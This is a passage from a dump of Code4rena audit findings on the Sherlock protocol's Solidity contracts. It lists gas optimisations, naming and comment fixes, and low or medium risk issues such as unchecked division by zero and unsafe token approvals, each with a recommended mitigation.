https://github.com/aave/aave-protocol/blob/4b4545fb583fd4f400507b10f3c3114f45b8a037/contracts/configuration/LendingPoolAddressesProvider.sol#L58-L65   Not sure how likely is that lending pool implementation will change so marking this as 'Low'.  ## Recommended Mitigation Steps Before calling lp.deposit check that the approval is sufficient and increase otherwise.  "}, {"title": "transferFrom when from = to", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/64", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "transferFrom when from = to"}, {"title": "Use EnumerableSet to store protocols", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/63", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Use EnumerableSet to store protocols"}, {"title": "typo: `ineglible_yield_amount` -> `ineligible_yield_amount`", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/62", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  cmichel   # Vulnerability details    "}, {"title": "[PoolBase.sol] Calculations are being divided before being multiplied ", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/61", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "disagree with severity"], "target": "2021-07-sherlock-findings", "body": "[PoolBase.sol] Calculations are being divided before being multiplied "}, {"title": "Use calldata is a little more gas efficient ", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/60", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact Using `calldata` for function parameter is a slightly more gas efficient   ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L192-L225 ## Tools Used None ## Recommended Mitigation Steps ref: https://mudit.blog/solidity-gas-optimization-tips/   "}, {"title": "Gov.sol: Use SafeERC20.safeApprove in tokenUnload()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/51", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  This is probably an oversight since `SafeERC20` was imported and `safeTransfer()` was used for ERC20 token transfers. Nevertheless, note that `approve()` will fail for certain token implementations that do not return a boolean value (Eg. OMG and ADX tokens). Hence it is recommend to use `safeApprove()`.  ### Recommended Mitigation Steps  Update to `_token.safeApprove(address(_native), totalToken)` in `tokenUnload()`.  "}, {"title": "Yield distribution after large payout seems unfair", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/50", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact When a large payout occurs, it will lower unallocatedSherX. This could mean some parties might not be able to get their Yield.  The first couple of users (for which harvest is called or which transfer tokens) will be able to get their full Yield,  until the moment unallocatedSherX is depleted. The next users don't get any yield at all. This doesn't seem fair.  ## Proof of Concept // https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L309 function doYield(ILock token,address from, address to, uint256 amount) private { ... ps.unallocatedSherX = ps.unallocatedSherX.sub(withdrawable_amount);  //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Payout.sol#L108  function payout( address _payout, IERC20[] memory _tokens, uint256[] memory _firstMoneyOut, uint256[] memory _amounts, uint256[] memory _unallocatedSherX,  address _exclude ) external override onlyGovPayout {     // all pools (including SherX pool) can be deducted fmo and balance     // deducting balance will reduce the users underlying value of stake token     // for every pool, _unallocatedSherX can be deducted, this will decrease outstanding SherX rewards     // for users that did not claim them (e.g materialized them and included in SherX pool) ....     // Subtract from unallocated, as the tokens are now allocated to this payout call         ps.unallocatedSherX = ps.unallocatedSherX.sub(unallocatedSherX);  ## Tools Used  ## Recommended Mitigation Steps If unallocatedSherX is insufficient to provide for all the yields, only give the yields partly (so that each user gets their fair share).   "}, {"title": "SherX.sol: Unsafe casting of _weights  in setWeights()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/47", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "SherX.sol: Unsafe casting of _weights  in setWeights()"}, {"title": "SherX.sol: Redeeming SherX may run out of gas", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/46", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "SherX.sol: Redeeming SherX may run out of gas"}, {"title": "SherX.sol: Change variable names weightSub and weightAdd to totalWeightOld and totalWeightNew", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/45", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In `setWeights()`, the variables `weightAdd` and `weightSub` are used to ensure that there is no difference in the total weight.  ### Recommended Mitigation Steps  Consider `totalWeightOld` and `totalWeightNew` as the variable names instead as they are more indicative of the intended usage and behaviour.  "}, {"title": "PoolStrategy.sol: Consider minimising trust with implemented strategies", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "PoolStrategy.sol: Consider minimising trust with implemented strategies"}, {"title": "PoolBase.sol: Consider returning 0 instead of reverting in LockToToken()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/42", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "PoolBase.sol: Consider returning 0 instead of reverting in LockToToken()"}, {"title": "Manager.sol: Pass ps.sherXUnderlying instead of ps into updateData()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/40", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The only value from poolStorage in `updateData()` is the `sherXUnderlying` value. It is cheaper to pass this `uint256` variable instead of the storage variable itself.  ### Recommended Mitigation Steps  Change `PoolStorage.Base storage ps` to `uint256 sherXUnderlying`, saves about ~160 gas.  "}, {"title": "Manager.sol: Can avoid safemath sub in usdPerBlock and usdPool calculations", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In `updateData()`,   ```jsx if (sub > add) {   usdPerBlock = usdPerBlock.sub(sub.sub(add).div(10**18)); } else {   usdPerBlock = usdPerBlock.add(add.sub(sub).div(10**18)); } ```  we can calculate the difference between `sub` and `add` in both cases without SafeMath because we already know one is greater than the other.   Also, the logic can be made similar to the `usdPool` calculation since nothing changes in the case where `sub == add`.  The same safemath subtraction avoidance can be implemented for the `usdPool` calculation.  Finally, the variables `sub` and `add` are confusing (makes the code difficult to read because of safemath's add and sub). It is suggested to rename them to `oldUsdPerBlock` and `newUsdPerBlock` respectively.  ### Recommended Mitigation Steps  ```jsx // If oldUsdPerBlock == newUsdPerBlock, nothing changes if (oldUsdPerBlock > newUsdPerBlock) {   usdPerBlock = usdPerBlock.sub((oldUsdPerBlock - newUsdPerBlock).div(10**18)); } else if (oldUsdPerBlock < newUsdPerBlock) {   usdPerBlock = usdPerBlock.add((newUsdPerBlock - oldUsdPerBlock).div(10**18)); }  if (_newUsd > _oldUsd) {  usdPool = usdPool.add((_newUsd - _oldUsd).mul(ps.sherXUnderlying).div(10**18)); } else if (_newUsd < _oldUsd) {  usdPool = usdPool.sub((_oldUsd - _newUsd).mul(ps.sherXUnderlying).div(10**18)); } ```  "}, {"title": "LibSherX.sol: Optimise calcUnderlying()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  - `tokens` can be directly be assigned to `gs.tokensSherX`. - Redundant zero Initialization of the array element `amounts[i] = 0;` in the else case of `calcUnderlying()` (L69-L71).  ### Recommended Mitigation Steps  ```jsx function calcUnderlying(uint256 _amount)  external  view returns (IERC20[] memory tokens, uint256[] memory amounts) {  GovStorage.Base storage gs = GovStorage.gs();    tokens = gs.tokensSherX;   amounts = new uint256[](gs.tokensSherX.length);    uint256 total = getTotalSherX();    for (uint256 i; i < gs.tokensSherX.length; i++) {     IERC20 token = tokens[i];     if (total > 0) {       PoolStorage.Base storage ps = PoolStorage.ps(token);       amounts[i] = ps.sherXUnderlying.add(LibPool.getTotalAccruedDebt(token)).mul(_amount).div(         total       );     }   } } ```  Gas reporter reports a gas reduction of ~150 gas. Gas savings should scale with number of underlying collaterals.  "}, {"title": "Gov.sol: Small refactoring of tokenInit() to save gas", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/35", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Gov.sol: Small refactoring of tokenInit() to save gas"}, {"title": "Gov.sol: Optimise protocolRemove()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Gov.sol: Optimise protocolRemove()"}, {"title": "Gov.sol: Non-intuitive comment in tokenRemove()", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/33", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In `tokenRemove()`, the comment `// NOTE: removed because firstMoneyOut will always be less or equal to stakeBalance` is not intuitive because it is not clear what is removed.  Perhaps `// NOTE: check that firstMoneyOut == 0 not needed since firstMoneyOut <= stakeBalance` will be better.  "}, {"title": "Gov.sol: Consider abstracting protocolUpdate() and protocolDepositAdd() to avoid duplicate checks", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/31", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Gov.sol: Consider abstracting protocolUpdate() and protocolDepositAdd() to avoid duplicate checks"}, {"title": "Define Global Constants", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/30", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  For better code readability, it would be good to specify the constants `uint16(-1)`, `uint32(-1)` and `10**18` in a separate contract to be imported in relevant contracts.  - `10e17` was used in payout() instead of the conventional `10**18` defined everywhere else - The docs specified that the cooldown fee and sherX weight are scaled by `10**18`, but they are scaled by `uint32(-1)` and `uint16(-1)` respectively (interfaces natspec is correct).  ### Recommended Mitigation Steps  Consider suggestive constants like `MAX_SHERX_WEIGHT` or `SHERX_DENOM`, `MAX_COOLDOWN_FEE` or `COOLDOWN_FEE_DENOM` and `PRECISION`.  "}, {"title": "prevent burn in _transfer", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/29", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function _transfer in SherXERC20.sol allow transfer to address 0. This is usually considered the same as burning the tokens and the Emit is indistinguishable from an Emit of a burn.  However the burn function in LibSherXERC20.sol has extra functionality, which _transfer doesn't have. sx20.totalSupply = sx20.totalSupply.sub(_amount);  So it is safer to prevent _transfer to address 0 (which is also done in the openzeppelin erc20 contract) See: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L226  Note: minting from address 0 will not work because that is blocked by the safemath sub in:  sx20.balances[_from] = sx20.balances[_from].sub(_amount);  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherXERC20.sol#L118 function _transfer(address _from, address _to, uint256 _amount) internal {     SherXERC20Storage.Base storage sx20 = SherXERC20Storage.sx20();     sx20.balances[_from] = sx20.balances[_from].sub(_amount);     sx20.balances[_to] = sx20.balances[_to].add(_amount);     emit Transfer(_from, _to, _amount);   }  // https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherXERC20.sol#L29 function burn(address _from, uint256 _amount) internal {     SherXERC20Storage.Base storage sx20 = SherXERC20Storage.sx20();     sx20.balances[_from] = sx20.balances[_from].sub(_amount);     sx20.totalSupply = sx20.totalSupply.sub(_amount);     emit Transfer(_from, address(0), _amount);   } ## Tools Used  ## Recommended Mitigation Steps add something like to following to _transfer of SherXERC20.sol:         require(_to!= address(0), \"Transfer to the zero address\");  Or update sx20.totalSupply if burning a desired operation.  "}, {"title": "result of getUnstakeEntrySize is incorrect", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/27", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "result of getUnstakeEntrySize is incorrect"}, {"title": "unbounded loop in getInitialUnstakeEntry ", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/26", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "unbounded loop in getInitialUnstakeEntry "}, {"title": "extra precautions in stakeBalance", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/25", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "extra precautions in stakeBalance"}, {"title": "series of divs", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/24", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function payout contains an expression with 3 sequential divs. This is generally not recommended because it could lead to rounding errors / loss of precision. Also a div is usually more expensive than a mul. Also an intermediate division by 0 (if SherXERC20Storage.sx20().totalSupply) == 0) could occur.  ## Proof of Concept //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Payout.sol#L108 function payout( ..  uint256 deduction =  excludeUsd.div(curTotalUsdPool.div(SherXERC20Storage.sx20().totalSupply)).div(10e17);  ## Tools Used  ## Recommended Mitigation Steps Verify the formula and replace with something like: uint256 deduction =  excludeUsd.mul(SherXERC20Storage.sx20().totalSupply).div(  curTotalUsdPool.mul(10e17) )  "}, {"title": "don't use add(add.sub(sub)", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/23", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function _updateData contains variables with the names \"sub\" and \"add\". There are also functions with the names \"sub\" and \"add\". The resulting code is not very readable:       usdPerBlock = usdPerBlock.sub(sub.sub(add).div(10**18));       usdPerBlock = usdPerBlock.add(add.sub(sub).div(10**18));  Generally it is not recommended to use the same name for variables and functions.  ## Proof of Concept // https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Manager.sol#L386  function _updateData( ..     uint256 sub = _oldPremium.mul(_oldUsd);  ..    uint256 add = _newPremium.mul(_newUsd);      if (sub > add) {       usdPerBlock = usdPerBlock.sub(sub.sub(add).div(10**18));     } else {       usdPerBlock = usdPerBlock.add(add.sub(sub).div(10**18));     }  ## Tools Used  ## Recommended Mitigation Steps Rename the variables \"add\" and \"sub\" to different names.   "}, {"title": "prevent div by 0", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/22", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact On several locations in the code precautions are taken not to divide by 0, because this will revert the code. However on some locations this isn't done.  Especially in doYield a first check is done for totalAmount >0, however a few lines later there is an other div(totalAmount) which isn't checked.  The proof of concept show another few examples.  ## Proof of Concept // https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L309 function doYield(ILock token,address from,address to,uint256 amount) private { ..     uint256 totalAmount = ps.lockToken.totalSupply(); ..      if (totalAmount > 0) {       ineglible_yield_amount = ps.sWeight.mul(amount).div(totalAmount);     } else {       ineglible_yield_amount = amount;     }     if (from != address(0)) {       uint256 raw_amount = ps.sWeight.mul(userAmount).div(totalAmount);  // totalAmount could be 0, see lines above  // https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L295 function activateCooldown(uint256 _amount, IERC20 _token) external override returns (uint256) { ...   uint256 tokenAmount = fee.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());   // ps.lockToken.totalSupply() might be 0  //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L351  function unstake( uint256 _id, address _receiver, IERC20 _token ) external override returns (uint256 amount) { ...    amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());  // // ps.lockToken.totalSupply() might be 0  //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibPool.sol#L67  function stake( PoolStorage.Base storage ps,uint256 _amount, address _receiver ) external returns (uint256 lock) { ...      lock = _amount.mul(totalLock).div(stakeBalance(ps));   // stakeBalance(ps) might be 0  ## Tools Used  ## Recommended Mitigation Steps Make sure division by 0 won't occur by checking the variables beforehand and handling this edge case.  "}, {"title": "x > 0 ==> x!=0", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact A small gas optimization is possible by replacing x > 0 with  x != 0 provide x is an unsigned integer. As the entire code only uses unsigned integers it can be done on all these locations. The proof of concept shows the locations where the \"x > 0\" construction is used.  ## Proof of Concept  .\\facets\\Gov.sol:    require(_tokens.length > 0, 'ZERO'); .\\facets\\Gov.sol:    if (totalToken > 0) { .\\facets\\Gov.sol:    if (totalFee > 0) { .\\facets\\Gov.sol:    if (balance > 0) { .\\facets\\Manager.sol:    if (ps.sherXUnderlying > 0) { .\\facets\\Manager.sol:    if (usdPerBlock > 0 && _currentTotalSupply == 0) { .\\facets\\Manager.sol:    } else if (usdPool > 0) { .\\facets\\Payout.sol:      if (unallocatedSherX > 0) { .\\facets\\Payout.sol:      if (firstMoneyOut > 0) { .\\facets\\Payout.sol:    if (totalUnallocatedSherX > 0) { .\\facets\\PoolBase.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\PoolBase.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\PoolBase.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\PoolBase.sol:    if (fee > 0) { .\\facets\\PoolBase.sol:    if (_forceDebt && accrued > 0) { .\\facets\\PoolBase.sol:    if (ps.protocolBalance[_protocol] > 0) { .\\facets\\PoolBase.sol:    if (ps.protocolPremium[_protocol] > 0) { .\\facets\\PoolOpen.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\PoolStrategy.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\PoolStrategy.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\SherX.sol:    if (stakeBalance > 0) { .\\facets\\SherX.sol:    require(_amount > 0, 'AMOUNT'); .\\facets\\SherX.sol:    if (totalAmount > 0) { .\\facets\\SherX.sol:      if (withdrawable_amount > 0) { .\\libraries\\LibSherX.sol:      if (total > 0) { .\\libraries\\LibSherX.sol:    if (sherX > 0) { .\\libraries\\LibSherX.sol:    if (sherX > 0) { .\\strategies\\AaveV2.sol:    require(amount > 0, 'ZERO_AMOUNT');  ## Tools Used grep  ## Recommended Mitigation Steps replace x > 0 with  x != 0  "}, {"title": "delete ps.stakeBalance", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/20", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact In the function tokenUnload, ps.stakeBalance is only deleted if balance >0 e.g it is deleted if ps.stakeBalance > ps.firstMoneyOut So if ps.stakeBalance ==  ps.firstMoneyOut then ps.stakeBalance will not be deleted. And then a call to tokenRemove will revert, because it checks for ps.stakeBalance to be 0  ## Proof of Concept // https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Gov.sol#L271  function tokenUnload( IERC20 _token, IRemove _native, address _remaining ) external override onlyGovMain { ...     uint256 balance = ps.stakeBalance.sub(ps.firstMoneyOut);     if (balance > 0) {       _token.safeTransfer(_remaining, balance);       delete ps.stakeBalance;     } ..   delete ps.firstMoneyOut;   function tokenRemove(IERC20 _token) external override onlyGovMain {   ...     require(ps.stakeBalance == 0, 'BALANCE_SET');   ## Tools Used  ## Recommended Mitigation Steps Check what to do in this edge case and add the appropriate code.  "}, {"title": "confusing comment in protocolUpdate", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/19", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The comment \"NOTE: UNUSED\" can be interpreted that both protocolManagers and protocolAgents are unused. See proof of concept below. However only protocolManagers is unused.   ## Proof of Concept //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Gov.sol#L148 function protocolUpdate( bytes32 _protocol, address _eoaProtocolAgent,address _eoaManager) public override onlyGovMain { ...     // NOTE: UNUSED     gs.protocolManagers[_protocol] = _eoaManager;     gs.protocolAgents[_protocol] = _eoaProtocolAgent;   }  ## Tools Used  ## Recommended Mitigation Steps Change the comment to: // NOTE: protocolManagers UNUSED    "}, {"title": "extra check setUnstakeWindow and setCooldown", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/18", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function setUnstakeWindow and setCooldown don't check that the input parameter isn't 0. So the values could accidentally be set to 0 (although unlikely). However you wouldn't want the to be 0 because that would allow attacks with flashloans (stake and unstake in the same transaction)  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Gov.sol#L124  function setUnstakeWindow(uint40 _unstakeWindow) external override onlyGovMain {     require(_unstakeWindow < 25000000, 'MAX'); // ~ approximate 10 years of blocks     GovStorage.gs().unstakeWindow = _unstakeWindow;   }    function setCooldown(uint40 _period) external override onlyGovMain {     require(_period < 25000000, 'MAX'); // ~ approximate 10 years of blocks     GovStorage.gs().unstakeCooldown = _period;   }  ## Tools Used  ## Recommended Mitigation Steps Check the input parameter of setUnstakeWindow and setCooldown isn't 0     "}, {"title": "Two functions with the same implementation", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/17", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The functions getTotalUsdPool and viewAccrueUSDPool have the same implementation. It saves some gas on the deployment to integrate these functions. Also the maintenance will be a bit easier.  ## Proof of Concept //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L42 function getTotalUsdPool() external view override returns (uint256) {     SherXStorage.Base storage sx = SherXStorage.sx();     return sx.totalUsdPool.add(block.number.sub(sx.totalUsdLastSettled).mul(sx.totalUsdPerBlock));   }  //https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherX.sol#L18   function viewAccrueUSDPool() public view returns (uint256 totalUsdPool) {     SherXStorage.Base storage sx = SherXStorage.sx();     totalUsdPool = sx.totalUsdPool.add(block.number.sub(sx.totalUsdLastSettled).mul(sx.totalUsdPerBlock));   }  ## Tools Used  ## Recommended Mitigation Steps Integrate the functions getTotalUsdPool and viewAccrueUSDPool (e.g. keep one and remove the other and update the references)  "}, {"title": "Different solidity pramas", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/16", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact Several different solidity pragmas are uses for different solidity version. Its cleaner to use the same version everywhere  ## Proof of Concept .\\ForeignLock.sol:pragma solidity ^0.7.4; .\\NativeLock.sol:pragma solidity ^0.7.4; .\\facets\\Gov.sol:pragma solidity ^0.7.4; .\\facets\\GovDev.sol:pragma solidity ^0.7.0; .\\facets\\Manager.sol:pragma solidity ^0.7.4; .\\facets\\Payout.sol:pragma solidity ^0.7.4; .\\facets\\PoolBase.sol:pragma solidity ^0.7.4; .\\facets\\PoolDevOnly.sol:pragma solidity ^0.7.4; .\\facets\\PoolOpen.sol:pragma solidity ^0.7.4; .\\facets\\PoolStrategy.sol:pragma solidity ^0.7.4; .\\facets\\SherX.sol:pragma solidity ^0.7.4; .\\facets\\SherXERC20.sol:pragma solidity ^0.7.1; .\\interfaces\\IGov.sol:pragma solidity ^0.7.4; .\\interfaces\\IGovDev.sol:pragma solidity ^0.7.4; .\\interfaces\\ILock.sol:pragma solidity ^0.7.4; .\\interfaces\\IManager.sol:pragma solidity ^0.7.4; .\\interfaces\\IPayout.sol:pragma solidity ^0.7.4; .\\interfaces\\IPoolBase.sol:pragma solidity ^0.7.4; .\\interfaces\\IPoolStake.sol:pragma solidity ^0.7.4; .\\interfaces\\IPoolStrategy.sol:pragma solidity ^0.7.4; .\\interfaces\\IRemove.sol:pragma solidity ^0.7.4; .\\interfaces\\ISherlock.sol:pragma solidity ^0.7.4; .\\interfaces\\ISherX.sol:pragma solidity ^0.7.4; .\\interfaces\\ISherXERC20.sol:pragma solidity ^0.7.1; .\\interfaces\\IStrategy.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\DataTypes.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\IAaveDistributionManager.sol:pragma solidity 0.7.6; .\\interfaces\\aaveV2\\IAaveGovernanceV2.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\IAaveIncentivesController.sol:pragma solidity 0.7.6; .\\interfaces\\aaveV2\\IAToken.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\IExecutorWithTimelock.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\IGovernanceV2Helper.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\ILendingPool.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\ILendingPoolAddressesProvider.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\IProposalValidator.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\IStakeAave.sol:pragma solidity ^0.7.4; .\\interfaces\\aaveV2\\MockAave.sol:pragma solidity ^0.7.4; .\\libraries\\LibPool.sol:pragma solidity ^0.7.4; .\\libraries\\LibSherX.sol:pragma solidity ^0.7.4; .\\libraries\\LibSherXERC20.sol:pragma solidity ^0.7.4; .\\storage\\GovStorage.sol:pragma solidity ^0.7.0; .\\storage\\PayoutStorage.sol:pragma solidity ^0.7.0; .\\storage\\PoolStorage.sol:pragma solidity ^0.7.0; .\\storage\\SherXERC20Storage.sol:pragma solidity ^0.7.1; .\\storage\\SherXStorage.sol:pragma solidity ^0.7.0; .\\strategies\\AaveV2.sol:pragma solidity ^0.7.4; .\\util\\ERC20Mock.sol:pragma solidity ^0.7.4; .\\util\\Import.sol:pragma solidity ^0.7.4; .\\util\\RemoveMock.sol:pragma solidity ^0.7.4; .\\util\\StrategyMock.sol:pragma solidity ^0.7.4;  ## Tools Used grep  ## Recommended Mitigation Steps  Use the same solidity version everywhere  "}, {"title": "Incorrect internal balance bookkeeping", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/12", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "disagree with severity"], "target": "2021-07-sherlock-findings", "body": "Incorrect internal balance bookkeeping"}, {"title": "Declare NativeLock underlying variable as immutable", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/9", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  patitonar   # Vulnerability details  ## Impact Reduce gas cost when reading the underlying variable from NativeLock given that it is only set once in the constructor  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/d9c610d2c3e98a412164160a787566818debeae4/contracts/NativeLock.sol#L14  ## Tools Used Manual review  ## Recommended Mitigation Steps IERC20 public override immutable underlying;  "}, {"title": "Aav2V2 is Ownable but not owner capabilites are used", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/8", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  patitonar   # Vulnerability details  ## Impact Reduce bytecode size of AaveV2 by removing Ownable given that there is no functionality for owners  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/d9c610d2c3e98a412164160a787566818debeae4/contracts/strategies/AaveV2.sol#L21  ## Tools Used Manual Review  ## Recommended Mitigation Steps Update AaveV2 to only extend from IStrategy and remove Ownable import  "}, {"title": "Avoid storing lp in AaveV2 constructor", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  patitonar   # Vulnerability details  ## Impact Reduce gas costs on constructor by not storing the result of a method invocation in a variable  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/d9c610d2c3e98a412164160a787566818debeae4/contracts/strategies/AaveV2.sol#L51-L52  ## Tools Used Manual Review  ## Recommended Mitigation Steps Use 